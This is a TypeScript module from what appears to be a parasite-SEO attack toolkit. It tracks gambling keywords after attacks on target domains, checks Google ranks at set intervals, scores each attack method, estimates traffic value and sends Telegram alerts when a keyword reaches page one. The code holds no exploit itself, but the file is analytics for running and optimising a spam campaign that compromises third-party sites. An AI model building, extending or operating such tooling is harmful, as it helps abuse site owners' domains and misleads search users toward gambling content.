/**
 * Keyword Performance Tracker
 * 
 * Tracks how gambling keywords perform after successful parasite SEO attacks:
 *   1. After attack success → record keyword + target + rank before
 *   2. Schedule rank checks at 1h, 24h, 7d, 30d intervals
 *   3. Correlate rank changes with attack methods
 *   4. Feed performance data back to AI Brain for smarter keyword selection
 *   5. Calculate ROI per keyword (traffic × CPC)
 */

import { eq, and, lte, desc, or } from "drizzle-orm";
import { keywordPerformance, type KeywordPerformance } from "../drizzle/schema";
import { checkKeywordRank, type SERPResult } from "./serp-tracker";
import { sendTelegramNotification, type TelegramNotification } from "./telegram-notifier";
import { getDb } from "./db";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface TrackingEntry {
  keyword: string;
  targetDomain: string;
  parasiteDomain: string;
  agenticSessionId?: number;
  attackMethod?: string;
  category?: string;
}

export interface PerformanceCheckResult {
  id: number;
  keyword: string;
  targetDomain: string;
  previousRank: number | null;
  currentRank: number | null;
  rankChange: number;
  stage: "1h" | "24h" | "7d" | "30d";
  isImproved: boolean;
}

export interface PerformanceStats {
  totalTracked: number;
  pending: number;
  tracking: number;
  peaked: number;
  stable: number;
  lost: number;
  completed: number;
  avgRankImprovement: number;
  onPage1Count: number;
  inTop3Count: number;
  bestPerformers: Array<{
    keyword: string;
    targetDomain: string;
    bestRank: number | null;
    rankImprovement: number | null;
    performanceScore: number;
    attackMethod: string | null;
  }>;
  worstPerformers: Array<{
    keyword: string;
    targetDomain: string;
    currentRank: number | null;
    rankImprovement: number | null;
    performanceScore: number;
  }>;
  byCategory: Record<string, { count: number; avgScore: number; avgImprovement: number }>;
  byMethod: Record<string, { count: number; avgScore: number; successRate: number }>;
}

export interface KeywordROI {
  keyword: string;
  category: string | null;
  totalAttacks: number;
  avgRankImprovement: number;
  bestRank: number | null;
  estimatedMonthlyTraffic: number;
  estimatedMonthlyValue: number;
  roiScore: number;
}

// ═══════════════════════════════════════════════════════
//  CORE: Start Tracking After Attack
// ═══════════════════════════════════════════════════════

export async function startTracking(entry: TrackingEntry): Promise<number | null> {
  const db = await getDb();
  if (!db) return null;

  try {
    let rankBefore: number | null = null;
    try {
      const serpResult = await checkKeywordRank(entry.targetDomain, entry.keyword, "TH", "desktop");
      rankBefore = serpResult.position;
    } catch (e) {
      console.log(`[KW-Perf] Could not check initial rank for "${entry.keyword}": ${e}`);
    }

    const nextCheck = new Date(Date.now() + 60 * 60 * 1000);

    const [result] = await db.insert(keywordPerformance).values({
      keyword: entry.keyword,
      targetDomain: entry.targetDomain,
      parasiteDomain: entry.parasiteDomain,
      agenticSessionId: entry.agenticSessionId || null,
      attackMethod: entry.attackMethod || null,
      attackedAt: new Date(),
      rankBefore,
      status: "pending",
      nextCheckAt: nextCheck,
      totalChecks: 0,
      category: entry.category || null,
      performanceScore: 0,
    });

    console.log(`[KW-Perf] Started tracking "${entry.keyword}" for ${entry.targetDomain} (rank before: ${rankBefore ?? "N/A"})`);
    return result.insertId;
  } catch (e) {
    console.error(`[KW-Perf] Failed to start tracking:`, e);
    return null;
  }
}

export async function startBatchTracking(entries: TrackingEntry[]): Promise<number[]> {
  const ids: number[] = [];
  for (const entry of entries) {
    const id = await startTracking(entry);
    if (id) ids.push(id);
    await new Promise(r => setTimeout(r, 2000));
  }
  return ids;
}

// ═══════════════════════════════════════════════════════
//  CORE: Process Pending Rank Checks
// ═══════════════════════════════════════════════════════

export async function processPendingChecks(): Promise<PerformanceCheckResult[]> {
  const db = await getDb();
  if (!db) return [];

  const now = new Date();
  const results: PerformanceCheckResult[] = [];

  const pending = await db.select()
    .from(keywordPerformance)
    .where(
      and(
        or(
          eq(keywordPerformance.status, "pending"),
          eq(keywordPerformance.status, "tracking"),
        ),
        lte(keywordPerformance.nextCheckAt, now),
      )
    )
    .limit(20);

  for (const entry of pending) {
    try {
      const stage = determineCheckStage(entry);
      if (!stage) {
        await db.update(keywordPerformance)
          .set({ status: "completed" })
          .where(eq(keywordPerformance.id, entry.id));
        continue;
      }

      const serpResult = await checkKeywordRank(
        entry.targetDomain, entry.keyword, "TH", "desktop", entry.currentRank,
      );

      const currentRank = serpResult.position;
      const previousRank = entry.currentRank ?? entry.rankBefore;
      const rankChange = calculateRankChange(previousRank, currentRank);
      const bestRank = getBestRank(entry.bestRank, currentRank);
      const improvement = calculateImprovement(entry.rankBefore, currentRank);
      const isOnPage1 = currentRank !== null && currentRank <= 10;
      const isInTop3 = currentRank !== null && currentRank <= 3;

      const updateData: Record<string, any> = {
        currentRank,
        bestRank,
        rankImprovement: improvement,
        isOnPage1,
        isInTop3,
        lastCheckedAt: now,
        totalChecks: entry.totalChecks + 1,
        status: "tracking" as const,
        searchVolume: serpResult.searchVolume || entry.searchVolume,
        keywordDifficulty: serpResult.difficulty || entry.keywordDifficulty,
        cpc: serpResult.cpc ? String(serpResult.cpc) : entry.cpc,
      };

      if (stage === "1h") updateData.rankAfter1h = currentRank;
      else if (stage === "24h") updateData.rankAfter24h = currentRank;
      else if (stage === "7d") updateData.rankAfter7d = currentRank;
      else if (stage === "30d") updateData.rankAfter30d = currentRank;

      const nextStage = getNextStage(stage);
      if (nextStage) {
        updateData.nextCheckAt = getNextCheckTime(entry.attackedAt!, nextStage);
      } else {
        updateData.status = determineEndStatus(entry.rankBefore, currentRank, bestRank);
        updateData.nextCheckAt = null;
      }

      updateData.performanceScore = calculatePerformanceScore(
        entry.rankBefore, currentRank, bestRank, improvement,
        serpResult.searchVolume || 0, serpResult.cpc || 0,
      );

      if (currentRank !== null && serpResult.searchVolume) {
        updateData.estimatedTraffic = estimateTraffic(currentRank, serpResult.searchVolume);
        updateData.estimatedValue = String(
          estimateTraffic(currentRank, serpResult.searchVolume) * (serpResult.cpc || 0.5)
        );
      }

      await db.update(keywordPerformance)
        .set(updateData)
        .where(eq(keywordPerformance.id, entry.id));

      const result: PerformanceCheckResult = {
        id: entry.id,
        keyword: entry.keyword,
        targetDomain: entry.targetDomain,
        previousRank,
        currentRank,
        rankChange,
        stage,
        isImproved: rankChange > 0,
      };
      results.push(result);

      // Notify on significant events
      if (isOnPage1 && !entry.isOnPage1) {
        const notif: TelegramNotification = {
          type: "success",
          targetUrl: entry.targetDomain,
          details: `🎯 KEYWORD HIT PAGE 1!\n"${entry.keyword}" reached position ${currentRank} on Google!\nParasite: ${entry.parasiteDomain}\nMethod: ${entry.attackMethod || "unknown"}`,
        };
        await sendTelegramNotification(notif).catch(() => {});
      }

      if (isInTop3 && !entry.isInTop3) {
        const notif: TelegramNotification = {
          type: "success",
          targetUrl: entry.targetDomain,
          details: `🏆 KEYWORD IN TOP 3!\n"${entry.keyword}" reached position ${currentRank}!\nEstimated monthly traffic: ${updateData.estimatedTraffic || 0}`,
        };
        await sendTelegramNotification(notif).catch(() => {});
      }

      await new Promise(r => setTimeout(r, 3000));
    } catch (e) {
      console.error(`[KW-Perf] Check failed for "${entry.keyword}":`, e);
    }
  }

  if (results.length > 0) {
    console.log(`[KW-Perf] Processed ${results.length} rank checks. Improved: ${results.filter(r => r.isImproved).length}`);
  }

  return results;
}

// ═══════════════════════════════════════════════════════
//  STATS & ANALYTICS
// ═══════════════════════════════════════════════════════

export async function getPerformanceStats(): Promise<PerformanceStats> {
  const db = await getDb();
  const empty: PerformanceStats = {
    totalTracked: 0, pending: 0, tracking: 0, peaked: 0, stable: 0, lost: 0, completed: 0,
    avgRankImprovement: 0, onPage1Count: 0, inTop3Count: 0,
    bestPerformers: [], worstPerformers: [],
    byCategory: {}, byMethod: {},
  };
  if (!db) return empty;

  const all: KeywordPerformance[] = await db.select().from(keywordPerformance);
  if (all.length === 0) return empty;

  const stats: PerformanceStats = {
    totalTracked: all.length,
    pending: all.filter((e: KeywordPerformance) => e.status === "pending").length,
    tracking: all.filter((e: KeywordPerformance) => e.status === "tracking").length,
    peaked: all.filter((e: KeywordPerformance) => e.status === "peaked").length,
    stable: all.filter((e: KeywordPerformance) => e.status === "stable").length,
    lost: all.filter((e: KeywordPerformance) => e.status === "lost").length,
    completed: all.filter((e: KeywordPerformance) => e.status === "completed").length,
    avgRankImprovement: 0,
    onPage1Count: all.filter((e: KeywordPerformance) => e.isOnPage1).length,
    inTop3Count: all.filter((e: KeywordPerformance) => e.isInTop3).length,
    bestPerformers: [],
    worstPerformers: [],
    byCategory: {},
    byMethod: {},
  };

  // Average rank improvement
  const withImprovement = all.filter((e: KeywordPerformance) => e.rankImprovement !== null && e.rankImprovement !== 0);
  if (withImprovement.length > 0) {
    stats.avgRankImprovement = Math.round(
      withImprovement.reduce((sum: number, e: KeywordPerformance) => sum + (e.rankImprovement || 0), 0) / withImprovement.length
    );
  }

  // Best performers (top 10 by performance score)
  const sorted = [...all].sort((a: KeywordPerformance, b: KeywordPerformance) => b.performanceScore - a.performanceScore);
  stats.bestPerformers = sorted.slice(0, 10).map((e: KeywordPerformance) => ({
    keyword: e.keyword,
    targetDomain: e.targetDomain,
    bestRank: e.bestRank,
    rankImprovement: e.rankImprovement,
    performanceScore: e.performanceScore,
    attackMethod: e.attackMethod,
  }));

  // Worst performers (bottom 10)
  stats.worstPerformers = sorted.slice(-10).reverse().map((e: KeywordPerformance) => ({
    keyword: e.keyword,
    targetDomain: e.targetDomain,
    currentRank: e.currentRank,
    rankImprovement: e.rankImprovement,
    performanceScore: e.performanceScore,
  }));

  // By category
  for (const entry of all) {
    const cat = entry.category || "uncategorized";
    if (!stats.byCategory[cat]) {
      stats.byCategory[cat] = { count: 0, avgScore: 0, avgImprovement: 0 };
    }
    stats.byCategory[cat].count++;
  }
  for (const cat of Object.keys(stats.byCategory)) {
    const catEntries = all.filter((e: KeywordPerformance) => (e.category || "uncategorized") === cat);
    stats.byCategory[cat].avgScore = Math.round(
      catEntries.reduce((s: number, e: KeywordPerformance) => s + e.performanceScore, 0) / catEntries.length
    );
    const catWithImprovement = catEntries.filter((e: KeywordPerformance) => e.rankImprovement !== null);
    if (catWithImprovement.length > 0) {
      stats.byCategory[cat].avgImprovement = Math.round(
        catWithImprovement.reduce((s: number, e: KeywordPerformance) => s + (e.rankImprovement || 0), 0) / catWithImprovement.length
      );
    }
  }

  // By attack method
  for (const entry of all) {
    const method = entry.attackMethod || "unknown";
    if (!stats.byMethod[method]) {
      stats.byMethod[method] = { count: 0, avgScore: 0, successRate: 0 };
    }
    stats.byMethod[method].count++;
  }
  for (const method of Object.keys(stats.byMethod)) {
    const methodEntries = all.filter((e: KeywordPerformance) => (e.attackMethod || "unknown") === method);
    stats.byMethod[method].avgScore = Math.round(
      methodEntries.reduce((s: number, e: KeywordPerformance) => s + e.performanceScore, 0) / methodEntries.length
    );
    const improved = methodEntries.filter((e: KeywordPerformance) => e.rankImprovement !== null && e.rankImprovement! > 0);
    stats.byMethod[method].successRate = Math.round((improved.length / methodEntries.length) * 100);
  }

  return stats;
}

/**
 * Get keyword ROI rankings — which keywords are most profitable to target.
 */
export async function getKeywordROI(): Promise<KeywordROI[]> {
  const db = await getDb();
  if (!db) return [];

  const all: KeywordPerformance[] = await db.select().from(keywordPerformance);
  
  // Group by keyword
  const byKeyword = new Map<string, KeywordPerformance[]>();
  for (const entry of all) {
    const key = entry.keyword;
    if (!byKeyword.has(key)) byKeyword.set(key, []);
    byKeyword.get(key)!.push(entry);
  }

  const roiList: KeywordROI[] = [];
  const entries_iter = Array.from(byKeyword.entries());
  for (const [keyword, entries] of entries_iter) {
    const totalAttacks = entries.length;
    const improvements = entries
      .filter((e: KeywordPerformance) => e.rankImprovement !== null)
      .map((e: KeywordPerformance) => e.rankImprovement!);
    const avgImprovement = improvements.length > 0
      ? Math.round(improvements.reduce((s: number, v: number) => s + v, 0) / improvements.length)
      : 0;
    const bestRank = entries.reduce((best: number | null, e: KeywordPerformance) => {
      if (e.bestRank === null) return best;
      return best === null ? e.bestRank : Math.min(best, e.bestRank);
    }, null as number | null);
    
    const latestWithTraffic = entries.find((e: KeywordPerformance) => e.estimatedTraffic > 0);
    const monthlyTraffic = latestWithTraffic?.estimatedTraffic || 0;
    const cpcEntry = entries.find((e: KeywordPerformance) => e.cpc !== null);
    const cpcVal = cpcEntry?.cpc ? parseFloat(String(cpcEntry.cpc)) : 0.5;
    const monthlyValue = monthlyTraffic * cpcVal;

    const roiScore = totalAttacks > 0
      ? Math.round(((avgImprovement > 0 ? avgImprovement : 0) * monthlyTraffic * cpcVal) / totalAttacks)
      : 0;

    roiList.push({
      keyword,
      category: entries[0].category,
      totalAttacks,
      avgRankImprovement: avgImprovement,
      bestRank,
      estimatedMonthlyTraffic: monthlyTraffic,
      estimatedMonthlyValue: Math.round(monthlyValue * 100) / 100,
      roiScore,
    });
  }

  return roiList.sort((a, b) => b.roiScore - a.roiScore);
}

/**
 * Get recent performance entries for UI display.
 */
export async function getRecentPerformance(limit: number = 50): Promise<KeywordPerformance[]> {
  const db = await getDb();
  if (!db) return [];

  return db.select()
    .from(keywordPerformance)
    .orderBy(desc(keywordPerformance.updatedAt))
    .limit(limit);
}

// ═══════════════════════════════════════════════════════
//  HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════

function determineCheckStage(entry: KeywordPerformance): "1h" | "24h" | "7d" | "30d" | null {
  if (entry.rankAfter1h === null) return "1h";
  if (entry.rankAfter24h === null) return "24h";
  if (entry.rankAfter7d === null) return "7d";
  if (entry.rankAfter30d === null) return "30d";
  return null;
}

function getNextStage(current: "1h" | "24h" | "7d" | "30d"): "24h" | "7d" | "30d" | null {
  const stages: Record<string, "24h" | "7d" | "30d" | null> = {
    "1h": "24h", "24h": "7d", "7d": "30d", "30d": null,
  };
  return stages[current] ?? null;
}

function getNextCheckTime(attackedAt: Date, stage: "24h" | "7d" | "30d"): Date {
  const base = new Date(attackedAt);
  switch (stage) {
    case "24h": return new Date(base.getTime() + 24 * 60 * 60 * 1000);
    case "7d": return new Date(base.getTime() + 7 * 24 * 60 * 60 * 1000);
    case "30d": return new Date(base.getTime() + 30 * 24 * 60 * 60 * 1000);
  }
}

function calculateRankChange(previous: number | null, current: number | null): number {
  if (previous === null || current === null) return 0;
  return previous - current;
}

function calculateImprovement(before: number | null, current: number | null): number {
  if (before === null && current !== null) return 100 - current;
  if (before === null || current === null) return 0;
  return before - current;
}

function getBestRank(currentBest: number | null, newRank: number | null): number | null {
  if (newRank === null) return currentBest;
  if (currentBest === null) return newRank;
  return Math.min(currentBest, newRank);
}

function determineEndStatus(
  rankBefore: number | null, currentRank: number | null, bestRank: number | null,
): "peaked" | "stable" | "lost" | "completed" {
  if (currentRank === null) return "lost";
  if (bestRank !== null && currentRank > bestRank + 10) return "peaked";
  if (rankBefore !== null && currentRank > rankBefore + 20) return "lost";
  if (currentRank <= 10) return "stable";
  return "completed";
}

function calculatePerformanceScore(
  rankBefore: number | null, currentRank: number | null, bestRank: number | null,
  improvement: number, searchVolume: number, cpc: number,
): number {
  let score = 0;
  if (improvement > 0) score += Math.min(40, improvement * 2);
  if (currentRank !== null) {
    if (currentRank <= 3) score += 30;
    else if (currentRank <= 10) score += 20;
    else if (currentRank <= 20) score += 10;
    else if (currentRank <= 50) score += 5;
  }
  if (searchVolume > 10000) score += 15;
  else if (searchVolume > 5000) score += 10;
  else if (searchVolume > 1000) score += 5;
  if (cpc > 5) score += 15;
  else if (cpc > 2) score += 10;
  else if (cpc > 0.5) score += 5;
  return Math.min(100, score);
}

function estimateTraffic(rank: number, searchVolume: number): number {
  const ctrByPosition: Record<number, number> = {
    1: 0.316, 2: 0.241, 3: 0.186, 4: 0.108, 5: 0.079,
    6: 0.061, 7: 0.051, 8: 0.044, 9: 0.038, 10: 0.034,
  };
  if (rank <= 10) return Math.round(searchVolume * (ctrByPosition[rank] || 0.03));
  if (rank <= 20) return Math.round(searchVolume * 0.01);
  if (rank <= 50) return Math.round(searchVolume * 0.003);
  return 0;
}
